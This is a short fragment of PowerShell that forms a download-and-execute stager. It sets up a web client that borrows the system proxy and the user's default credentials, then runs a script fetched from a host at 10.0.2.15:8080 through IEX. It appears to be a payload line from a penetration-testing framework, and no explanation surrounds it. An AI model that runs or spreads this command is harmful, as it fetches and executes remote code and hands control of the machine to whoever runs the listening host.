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F=new-object net.webclient;$F.proxy=[Net.WebRequest]::GetSystemWebProxy();$F.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $F.downloadstring('http://10.0.2.15:8080/JGSeJtZVBO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